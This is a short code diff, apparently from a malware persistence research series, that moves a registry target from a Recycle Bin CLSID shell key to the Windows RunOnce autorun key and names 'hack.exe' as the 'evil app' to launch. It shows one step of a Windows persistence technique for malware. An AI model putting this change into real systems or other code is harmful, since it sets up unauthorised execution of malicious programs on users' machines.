@@ -52,7 +52,7 @@ for port in [78, 79, 80]:
 
 # Registry
 # shell
-shell = "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell"
+shell = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
 
 # evil app
 exe = "C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe".encode('utf-8')
